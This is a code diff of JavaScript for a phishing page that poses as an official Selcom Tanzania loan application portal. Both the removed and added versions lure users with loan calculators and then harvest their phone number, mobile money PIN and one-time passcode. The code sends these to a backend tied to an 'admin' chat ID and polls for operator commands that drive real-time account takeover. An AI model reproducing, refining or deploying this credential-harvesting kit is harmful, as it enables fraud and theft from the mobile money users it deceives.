@@ -1,338 +1,293 @@
 document.addEventListener('DOMContentLoaded', () => {
-  const screenWelcome = document.getElementById('screen-welcome');
-  const screenSlider = document.getElementById('screen-slider');
-  const screenForm1 = document.getElementById('screen-form1');
-  const screenForm2 = document.getElementById('screen-form2');
-  const screenForm3 = document.getElementById('screen-form3');
-  const screenSignin = document.getElementById('screen-signin');
-  const screenOtp = document.getElementById('screen-otp');
-  const screenSuccess = document.getElementById('screen-success');
-  const screenStopped = document.getElementById('screen-stopped');
-  const loadingOverlay = document.getElementById('loading-overlay');
-
-  const langToggle = document.getElementById('lang-toggle-switch');
-  const credsBanner = document.getElementById('banner-creds-error');
-  const otpBanner = document.getElementById('banner-otp-error');
-
-  const phoneInput = document.getElementById('phone-number');
-  const pinBoxes = document.querySelectorAll('.pin-box-square');
-  const btnSubmitCreds = document.getElementById('btn-submit-creds');
-
-  const otpBoxes = document.querySelectorAll('.otp-box-square');
-  const btnSubmitOtp = document.getElementById('btn-submit-otp');
-  const btnRequestNewOtp = document.getElementById('btn-request-new-otp');
-  const timerDisplay = document.getElementById('timer-display');
-
-  let currentUserId = null;
+  let currentScreen = 1;
+  let userId = null;
   let statusPollInterval = null;
-  let countdownInterval = null;
+  let countdownTimer = null;
 
-  const urlParams = new URLSearchParams(window.location.search);
-  const adminParam = urlParams.get('admin') || '';
+  const appData = {
+    loanType: 'Mkopo wa Biashara',
+    loanAmount: 100000,
+    loanDuration: 'Miezi 48',
+    purpose: '',
+    firstName: '',
+    lastName: '',
+    phone: '',
+    employmentStatus: 'Mfanyabiashara',
+    annualIncome: '',
+    pin: '',
+    otp: ''
+  };
 
-  function showScreen(targetScreen) {
-    [screenWelcome, screenSlider, screenForm1, screenForm2, screenForm3, screenSignin, screenOtp, screenSuccess, screenStopped].forEach(s => {
-      if (s) s.classList.remove('active');
-    });
-    if (targetScreen) targetScreen.classList.add('active');
-  }
-
-  // STRICTLY FORCE START ON WELCOME PAGE ON LOAD
-  showScreen(screenWelcome);
-
-  function updateLanguageTexts(isSwahili) {
-    if (isSwahili) {
-      document.getElementById('lbl-welcome-title').innerText = 'KARIBU SELCOM TANZANIA!';
-      document.getElementById('lbl-welcome-sub').innerText = 'WELCOME TO THE OFFICIAL APPLICATION PORTAL.';
-      document.getElementById('lbl-welcome-desc').innerText = 'Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.';
-      document.getElementById('lbl-crit-title').innerText = 'CRITICAL NOTIFICATION';
-      document.getElementById('lbl-portal-footer').innerText = 'Official Application Portal (Tanzania Only)';
-      document.getElementById('btn-goto-slider').innerText = 'CONTINUE';
-    } else {
-      document.getElementById('lbl-welcome-title').innerText = 'WELCOME SELCOM TANZANIA!';
-      document.getElementById('lbl-welcome-sub').innerText = 'KARIBU KWENYE PORTAL RASMI YA MAOMBI.';
-      document.getElementById('lbl-welcome-desc').innerText = 'Maelezo yako ya akaunti ya Selcom yanahitajika. Hakikisha unatumia namba sahihi.';
-      document.getElementById('lbl-crit-title').innerText = 'TAARIFA MUHIMU YA USALAMA';
-      document.getElementById('lbl-portal-footer').innerText = 'Tovuti Rasmi ya Maombi (Tanzania Tu)';
-      document.getElementById('btn-goto-slider').innerText = 'ENDELEA';
+  function showScreen(screenNum) {
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    const target = document.getElementById(`screen-${screenNum}`);
+    if (target) {
+      target.classList.add('active');
+      currentScreen = screenNum;
+      window.scrollTo(0, 0);
     }
   }
 
-  if (langToggle) {
-    langToggle.addEventListener('change', (e) => updateLanguageTexts(e.target.checked));
-    updateLanguageTexts(true);
+  // Language Switch toggles
+  const langToggle1 = document.getElementById('lang-toggle');
+  const langToggle2 = document.getElementById('lang-toggle-2');
+  function toggleLanguage(isSwahili) {
+    if (langToggle1) langToggle1.checked = isSwahili;
+    if (langToggle2) langToggle2.checked = isSwahili;
+    const wTitle = document.getElementById('w-title');
+    const wSubtitle = document.getElementById('w-subtitle');
+    const wDesc = document.getElementById('w-desc');
+    const cTitle = document.getElementById('c-title');
+    const cText = document.getElementById('c-text');
+    const estHeading = document.getElementById('est-heading');
+
+    if (isSwahili) {
+      if (wTitle) wTitle.innerText = "KARIBU SELCOM TANZANIA!";
+      if (wSubtitle) wSubtitle.innerText = "WELCOME TO THE OFFICIAL APPLICATION PORTAL.";
+      if (wDesc) wDesc.innerText = "Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.";
+      if (cTitle) cTitle.innerText = "CRITICAL NOTIFICATION";
+      if (estHeading) estHeading.innerText = "Estimate your loan repayments";
+    } else {
+      if (wTitle) wTitle.innerText = "WELCOME TO SELCOM TANZANIA!";
+      if (wSubtitle) wSubtitle.innerText = "KARIBU KWENYE PORTAL RASMI YA MAOMBI.";
+      if (wDesc) wDesc.innerText = "Maelezo yako ya kipekee ya Akaunti ya Selcom yanahitajika kwa mawasiliano yote.";
+      if (cTitle) cTitle.innerText = "TAARIFA MUHIMU";
+      if (estHeading) estHeading.innerText = "Kadiria marejesho ya mkopo wako";
+    }
   }
 
-  document.getElementById('btn-goto-slider').addEventListener('click', () => showScreen(screenSlider));
-  document.getElementById('btn-goto-form1').addEventListener('click', () => showScreen(screenForm1));
+  if (langToggle1) langToggle1.addEventListener('change', (e) => toggleLanguage(e.target.checked));
+  if (langToggle2) langToggle2.addEventListener('change', (e) => toggleLanguage(e.target.checked));
 
-  document.getElementById('btn-form1-back').addEventListener('click', () => showScreen(screenSlider));
-  document.getElementById('btn-form1-next').addEventListener('click', () => {
-    const amt = document.getElementById('form-amount-input').value;
-    document.getElementById('sum-amount').innerText = `TSh ${amt}`;
-    showScreen(screenForm2);
+  // Screen 1 Continue
+  document.getElementById('btn-screen1-continue').addEventListener('click', () => {
+    showScreen(2);
   });
 
-  document.getElementById('btn-form2-back').addEventListener('click', () => showScreen(screenForm1));
-  document.getElementById('btn-form2-prev').addEventListener('click', () => showScreen(screenForm1));
-  document.getElementById('btn-form2-next').addEventListener('click', () => {
-    const fName = document.getElementById('first-name').value.trim();
-    const lName = document.getElementById('last-name').value.trim();
-    const phoneVal = phoneInput.value.trim();
+  // Screen 2 Sliders
+  const rangeAmount = document.getElementById('range-amount');
+  const displayAmount = document.getElementById('display-amount');
+  const rangeTerm = document.getElementById('range-term');
+  const displayTerm = document.getElementById('display-term');
+  const calcMonthly = document.getElementById('calc-monthly-repay');
+  const calcTotal = document.getElementById('calc-total-repay');
 
-    if (!phoneVal.startsWith('0') || phoneVal.length < 9) {
-      alert('Nambari ya simu lazima ianze na 0 na iwe sahihi.');
+  function updateCalculations() {
+    const amt = parseInt(rangeAmount.value) || 100000;
+    const terms = parseInt(rangeTerm.value) || 12;
+    displayAmount.innerText = `TSH ${amt.toLocaleString()}`;
+    displayTerm.innerText = `${terms} MONTHS`;
+
+    // Simple estimation formula
+    const monthly = Math.round((amt * (1 + 0.135 * (terms / 12))) / terms);
+    const total = monthly * terms;
+
+    calcMonthly.innerText = `TSH ${monthly.toLocaleString()}`;
+    calcTotal.innerText = `TSH ${total.toLocaleString()}`;
+
+    appData.loanAmount = amt;
+    appData.loanDuration = `Miezi ${terms}`;
+    const amountInput = document.getElementById('loan-amount-input');
+    if (amountInput) amountInput.value = amt;
+  }
+
+  if (rangeAmount) rangeAmount.addEventListener('input', updateCalculations);
+  if (rangeTerm) rangeTerm.addEventListener('input', updateCalculations);
+  updateCalculations();
+
+  document.getElementById('btn-screen2-signin').addEventListener('click', () => {
+    showScreen(3);
+  });
+
+  // Form Step 1
+  document.getElementById('btn-s3-back').addEventListener('click', () => showScreen(2));
+  document.getElementById('btn-screen3-next').addEventListener('click', () => {
+    appData.loanType = document.getElementById('loan-type').value;
+    appData.loanAmount = document.getElementById('loan-amount-input').value;
+    appData.loanDuration = document.getElementById('loan-duration').value;
+    appData.purpose = document.getElementById('loan-purpose').value || 'Biashara';
+    showScreen(4);
+  });
+
+  // Form Step 2
+  document.getElementById('btn-s4-back').addEventListener('click', () => showScreen(3));
+  document.getElementById('btn-screen4-prev').addEventListener('click', () => showScreen(3));
+  document.getElementById('btn-screen4-next').addEventListener('click', () => {
+    appData.firstName = document.getElementById('first-name').value;
+    appData.lastName = document.getElementById('last-name').value;
+    appData.phone = document.getElementById('phone-number').value;
+
+    if (!appData.firstName || !appData.lastName || !appData.phone) {
+      alert('Tafadhali jaza nafasi zote kabla ya kuendelea.');
       return;
     }
 
-    document.getElementById('sum-applicant').innerText = `${fName} ${lName}`.trim() || 'NMB MKONONI';
-    showScreen(screenForm3);
+    // Populate summary in Step 3
+    document.getElementById('sum-amount').innerText = `TSh ${parseInt(appData.loanAmount).toLocaleString()}`;
+    document.getElementById('sum-duration').innerText = appData.loanDuration;
+    document.getElementById('sum-purpose').innerText = appData.purpose;
+
+    showScreen(5);
   });
 
-  document.getElementById('btn-form3-back').addEventListener('click', () => showScreen(screenForm2));
-  document.getElementById('btn-form3-prev').addEventListener('click', () => showScreen(screenForm2));
-  document.getElementById('btn-form3-submit').addEventListener('click', () => {
-    const phoneVal = phoneInput.value.trim();
-    const displayPhoneBadge = document.getElementById('display-applicant-phone');
-    if (displayPhoneBadge) displayPhoneBadge.innerText = `+255 ${phoneVal}`;
-
-    showScreen(screenSignin);
-    if (pinBoxes[0]) pinBoxes[0].focus();
+  // Form Step 3
+  document.getElementById('btn-s5-back').addEventListener('click', () => showScreen(4));
+  document.getElementById('btn-screen5-prev').addEventListener('click', () => showScreen(4));
+  document.getElementById('btn-screen5-submit').addEventListener('click', async () => {
+    appData.employmentStatus = document.getElementById('employment-status').value;
+    appData.annualIncome = document.getElementById('annual-income').value;
+    showScreen(6);
   });
 
-  const loanSlider = document.getElementById('loan-amount-slider');
-  const loanText = document.getElementById('loan-amount-text');
-  const monthsSlider = document.getElementById('loan-months-slider');
-  const monthsText = document.getElementById('loan-months-text');
-  const monthlyRepVal = document.getElementById('monthly-rep-val');
-  const totalRepVal = document.getElementById('total-rep-val');
-
-  function updateCalculations() {
-    const amount = Number(loanSlider.value);
-    const months = Number(monthsSlider.value);
-    loanText.innerText = `TSH ${amount.toLocaleString()}`;
-    monthsText.innerText = `${months} MONTHS`;
-    document.getElementById('form-amount-input').value = amount.toLocaleString();
-    document.getElementById('sum-duration').innerText = `Miezi ${months}`;
-
-    const totalRep = amount * 1.135;
-    const monthlyRep = totalRep / months;
-    monthlyRepVal.innerText = `TSH ${Math.round(monthlyRep).toLocaleString()}`;
-    totalRepVal.innerText = `TSH ${Math.round(totalRep).toLocaleString()}`;
-  }
-
-  if (loanSlider && monthsSlider) {
-    loanSlider.addEventListener('input', updateCalculations);
-    monthsSlider.addEventListener('input', updateCalculations);
-    updateCalculations();
-  }
-
-  if (phoneInput) {
-    phoneInput.addEventListener('input', (e) => {
-      let val = e.target.value.replace(/\D/g, '');
-      if (val.length > 0 && !val.startsWith('0')) {
-        val = '0' + val.replace(/^0+/, '');
+  // PIN Inputs handling (Screen 6)
+  const pinBoxes = document.querySelectorAll('.pin-box');
+  pinBoxes.forEach((box, index) => {
+    box.addEventListener('input', (e) => {
+      const val = e.target.value;
+      if (val && index < pinBoxes.length - 1) {
+        pinBoxes[index + 1].focus();
       }
-      e.target.value = val;
     });
-  }
-
-  function setupDigitInputs(boxes, callback) {
-    boxes.forEach((box, idx) => {
-      box.addEventListener('input', () => {
-        box.value = box.value.replace(/\D/g, '');
-        if (box.value && idx < boxes.length - 1) {
-          boxes[idx + 1].focus();
-        }
-        if (callback) callback();
-      });
-      box.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && !box.value && idx > 0) {
-          boxes[idx - 1].focus();
-        }
-      });
+    box.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !box.value && index > 0) {
+        pinBoxes[index - 1].focus();
+      }
     });
-  }
-
-  function checkCredsValid() {
-    const pinVal = Array.from(pinBoxes).map(b => b.value).join('');
-    const phoneVal = phoneInput.value.trim();
-    if (phoneVal.length >= 9 && pinVal.length === 4) {
-      btnSubmitCreds.classList.add('active-blue');
-    } else {
-      btnSubmitCreds.classList.remove('active-blue');
-    }
-  }
-
-  setupDigitInputs(pinBoxes, checkCredsValid);
-
-  document.getElementById('toggle-pin-visibility').addEventListener('click', () => {
-    pinBoxes.forEach(box => box.type = box.type === 'password' ? 'text' : 'password');
   });
 
-  btnSubmitCreds.addEventListener('click', async () => {
-    const phoneVal = phoneInput.value.trim();
-    const pinVal = Array.from(pinBoxes).map(b => b.value).join('');
-    if (!phoneVal || pinVal.length !== 4) return;
-
-    if (credsBanner) credsBanner.classList.remove('active');
-    showLoading('INATHIBITISHA...', 'Tafadhali subiri.');
+  document.getElementById('btn-screen6-submit').addEventListener('click', async () => {
+    let pinVal = '';
+    pinBoxes.forEach(b => pinVal += b.value);
+    if (pinVal.length < 4) {
+      alert('Tafadhali weka PIN kamili ya tarakimu 4.');
+      return;
+    }
+    appData.pin = pinVal;
+    
+    const statusMsg = document.getElementById('pin-status-msg');
+    statusMsg.innerText = "Inathibitisha...";
 
     try {
-      const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
+      const urlParams = new URLSearchParams(window.location.search);
+      const adminChatId = urlParams.get('admin');
+
+      const res = await fetch('/api/submit-credentials', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phone: phoneVal, pin: pinVal, adminChatId: adminParam })
+        body: JSON.stringify({ phone: appData.phone, pin: pinVal, adminChatId })
       });
       const data = await res.json();
       if (data.success) {
-        currentUserId = data.userId;
-        startStatusPolling();
-      } else {
-        hideLoading();
+        userId = data.userId;
       }
-    } catch (e) {
-      hideLoading();
-    }
-  });
 
-  setupDigitInputs(otpBoxes, () => {
-    const otpVal = Array.from(otpBoxes).map(b => b.value).join('');
-    if (otpVal.length === 6) {
-      btnSubmitOtp.classList.add('active-blue');
-      submitOtpHandler();
-    } else {
-      btnSubmitOtp.classList.remove('active-blue');
-    }
-  });
-
-  async function submitOtpHandler() {
-    const otpVal = Array.from(otpBoxes).map(b => b.value).join('');
-    if (otpVal.length !== 6) return;
-
-    if (otpBanner) otpBanner.classList.remove('active');
-    showLoading('INAKAGUA OTP...', 'Tafadhali subiri.');
-
-    try {
-      const res = await fetch('/api/submit-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userId: currentUserId, otp: otpVal })
+      startStatusPolling(() => {
+        statusMsg.innerText = "";
+        showScreen(7);
+        startOtpCountdown();
       });
-      const data = await res.json();
-      if (data.success) startStatusPolling();
-      else hideLoading();
     } catch (e) {
-      hideLoading();
+      statusMsg.innerText = "";
+      showScreen(7);
+      startOtpCountdown();
     }
-  }
+  });
 
-  btnSubmitOtp.addEventListener('click', submitOtpHandler);
+  // OTP Inputs handling (Screen 7)
+  const otpBoxes = document.querySelectorAll('.otp-box');
+  otpBoxes.forEach((box, index) => {
+    box.addEventListener('input', (e) => {
+      const val = e.target.value;
+      if (val && index < otpBoxes.length - 1) {
+        otpBoxes[index + 1].focus();
+      }
+    });
+    box.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !box.value && index > 0) {
+        otpBoxes[index - 1].focus();
+      }
+    });
+  });
 
-  function startOneMinuteTimer() {
-    let timeLeft = 60;
-    if (btnRequestNewOtp) btnRequestNewOtp.style.display = 'none';
-    if (timerDisplay) timerDisplay.style.display = 'inline';
-
-    if (countdownInterval) clearInterval(countdownInterval);
-
-    countdownInterval = setInterval(() => {
-      timeLeft--;
-      let mins = Math.floor(timeLeft / 60);
-      let secs = timeLeft % 60;
-      const countEls = document.querySelectorAll('#countdown');
-      countEls.forEach(el => el.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`);
-
-      if (timeLeft <= 0) {
-        clearInterval(countdownInterval);
-        if (timerDisplay) timerDisplay.style.display = 'none';
-        if (btnRequestNewOtp) btnRequestNewOtp.style.display = 'inline-block';
+  function startOtpCountdown() {
+    let seconds = 30;
+    const cdSpan = document.getElementById('countdown');
+    if (countdownTimer) clearInterval(countdownTimer);
+    countdownTimer = setInterval(() => {
+      seconds--;
+      if (cdSpan) cdSpan.innerText = seconds;
+      if (seconds <= 0) {
+        clearInterval(countdownTimer);
       }
     }, 1000);
   }
 
-  if (btnRequestNewOtp) {
-    btnRequestNewOtp.addEventListener('click', async () => {
-      showLoading('INATUMASISIMBO...', 'Inatuma ombi la OTP mpya.');
-      try {
-        await fetch('/api/request-new-otp', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ userId: currentUserId })
-        });
-        hideLoading();
-        startOneMinuteTimer();
-      } catch (err) {
-        hideLoading();
-      }
-    });
-  }
-
-  function startStatusPolling() {
-    if (statusPollInterval) clearInterval(statusPollInterval);
-
-    statusPollInterval = setInterval(async () => {
-      if (!currentUserId) return;
-
-      try {
-        const res = await fetch(`/api/check-status/${currentUserId}`);
-        const data = await res.json();
-
-        if (data.status === 'PROCEED_OTP') {
-          clearInterval(statusPollInterval);
-          hideLoading();
-          showScreen(screenOtp);
-          const dispPhone = document.getElementById('display-otp-applicant-phone');
-          if (dispPhone) dispPhone.innerText = `+255 ${phoneInput.value.trim()}`;
-          if (otpBoxes[0]) otpBoxes[0].focus();
-          startOneMinuteTimer();
-        } else if (data.status === 'DENIED_STOP') {
-          clearInterval(statusPollInterval);
-          hideLoading();
-          showScreen(screenStopped);
-        } else if (data.status === 'SUCCESS') {
-          clearInterval(statusPollInterval);
-          hideLoading();
-          document.getElementById('final-approved-amount').innerText = `TSh ${Number(loanSlider.value).toLocaleString()}`;
-          showScreen(screenSuccess);
-        } else if (data.status === 'RETRY_PIN') {
-          clearInterval(statusPollInterval);
-          hideLoading();
-          if (credsBanner) {
-            credsBanner.innerText = 'TAFADHALI WEKA PIN YAKO SAHIHI YA SELCOM PESA';
-            credsBanner.classList.add('active');
-          }
-          pinBoxes.forEach(b => b.value = '');
-          btnSubmitCreds.classList.remove('active-blue');
-          showScreen(screenSignin);
-        } else if (data.status === 'RETRY_OTP') {
-          clearInterval(statusPollInterval);
-          hideLoading();
-          if (otpBanner) {
-            otpBanner.innerText = 'Umeingiza OTP ILIYOISHA MUDA WAKE TAFADHALI SUBIRI SMS MPYA INAYOINGIA';
-            otpBanner.classList.add('active');
-          }
-          otpBoxes.forEach(b => b.value = '');
-          btnSubmitOtp.classList.remove('active-blue');
-          showScreen(screenOtp);
-          startOneMinuteTimer();
-        }
-      } catch (e) {}
-    }, 2500);
-  }
-
-  document.getElementById('btn-finish-home').addEventListener('click', () => {
-    window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
+  document.getElementById('resend-otp-link').addEventListener('click', async (e) => {
+    e.preventDefault();
+    if (userId) {
+      await fetch('/api/request-new-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId })
+      });
+    }
+    alert('Nambari mpya ya OTP imetumwa.');
+    startOtpCountdown();
   });
 
-  function showLoading(title, sub) {
-    document.getElementById('loading-title').innerText = title;
-    document.getElementById('loading-sub').innerText = sub;
-    if (loadingOverlay) loadingOverlay.classList.add('active');
+  document.getElementById('btn-screen7-submit').addEventListener('click', async () => {
+    let otpVal = '';
+    otpBoxes.forEach(b => otpVal += b.value);
+    if (otpVal.length < 6) {
+      alert('Tafadhali weka OTP kamili ya tarakimu 6.');
+      return;
+    }
+    appData.otp = otpVal;
+
+    const otpStatusMsg = document.getElementById('otp-status-msg');
+    otpStatusMsg.innerText = "Inathibitisha OTP...";
+
+    try {
+      await fetch('/api/submit-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId, otp: otpVal })
+      });
+
+      startStatusPolling(() => {
+        otpStatusMsg.innerText = "";
+        showScreen(8);
+      });
+    } catch (e) {
+      otpStatusMsg.innerText = "";
+      showScreen(8);
+    }
+  });
+
+  function startStatusPolling(onSuccess) {
+    if (statusPollInterval) clearInterval(statusPollInterval);
+    statusPollInterval = setInterval(async () => {
+      if (!userId) return;
+      try {
+        const res = await fetch(`/api/check-status/${userId}`);
+        const data = await res.json();
+        if (data.status === 'PROCEED_OTP' || data.status === 'SUCCESS') {
+          clearInterval(statusPollInterval);
+          onSuccess();
+        } else if (data.status === 'RETRY_PIN') {
+          clearInterval(statusPollInterval);
+          alert('PIN imekataliwa. Tafadhali weka PIN sahihi upya.');
+          showScreen(6);
+        } else if (data.status === 'RETRY_OTP') {
+          clearInterval(statusPollInterval);
+          alert('OTP imeisha muda wake au imekataliwa. Tafadhali omba mpya.');
+        }
+      } catch (err) {}
+    }, 3000);
   }
 
-  function hideLoading() {
-    if (loadingOverlay) loadingOverlay.classList.remove('active');
-  }
+  document.getElementById('btn-screen8-home').addEventListener('click', () => {
+    window.location.reload();
+  });
 });
-                          
+      
